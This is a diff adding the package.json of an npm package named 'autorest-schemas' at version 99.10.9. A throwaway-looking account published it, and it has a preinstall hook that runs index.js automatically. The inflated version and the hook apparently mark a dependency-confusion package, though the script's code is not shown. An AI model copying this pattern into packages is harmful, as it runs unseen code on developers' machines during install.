@@ -1,0 +1,39 @@
+{
+    "name": "autorest-schemas",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "autorest-schemas@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-UZqvszOBff164hGVDI673IOjoXH8Zs7NDi+YWA+4ctdnGGg5Xt6YTjwqit2Y7THcBEtB/2IUIm4pMtoaglGL/A==",
+        "shasum": "9bafbbf8c250680efe15fd76159cf0ec35cdae6b",
+        "tarball": "https://registry.npmjs.org/autorest-schemas/-/autorest-schemas-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5068,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPIy7ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqePRAAlUp8vB1IpCKC1/Rk/8h9pY8PXjLnKJJydOP2oWYI8cfypRZe\r\nwRi/U23GHNqH1SWBR8zAh1kuZTi3czKUGFqiHxKrAVv1oexwoFp4ABXOKyYp\r\n7HXiQkuuqczPVDVNOax+Ou7IONgDKEE3hsWD2VdfDCI5RW1VLT9gYVXQz+Fk\r\nQHjwIb+6Bc5ZMlDfu40ZVOVrwcoCk2OhYlgi4G5Cp9qxASCzVYkr34DUJz2s\r\norEZdTI59mIPm6lZIVgop3sG/FjEUinYQb6Q85gl6jBnOJ/fJpAwgl5/RAkt\r\nO0H9vH0qc7ao+/aCqWoNOcxMOeol7d8D+hzzPH2oPMM3AZLTpwsmqOEv+6OY\r\nGwcwOfmZWywcBLL+FCkROFipFjtmDx6CCq9pXV+Tcac4ZRSJp8dLmtpK+eFx\r\nd8k2YElpCuqO9H8xw2ia7UxQS6D+JeIeu/gELJgH657X5USyaKncb5eVQR5+\r\n1vRa5wA9ez7yGM4hrlUPVcQoZkWBfrRj8RBXgLnGCZsISWot3bpTs0HJtSvK\r\n1XsienBaDCE41F1IsGjHD9aa9RPmfGNaOCGOkR11OgfjYJ7bvQHtWQ/2YqY3\r\n8PxqdCe8WKQyWWUgN85dbdery2pOdBTNjzQW///EQa1qvJY1FUmMf4t76Mai\r\n+MCe5Kn+YlKPBVbuWA2OTZYkRAimVaXW7aM=\r\n=vIUH\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "58o3kg1m",
+        "email": "58o3kg1m@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "58o3kg1m",
+            "email": "58o3kg1m@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/autorest-schemas_99.10.9_1648135355786_0.4665702227432038"
+    },
+    "_hasShrinkwrap": false
+}
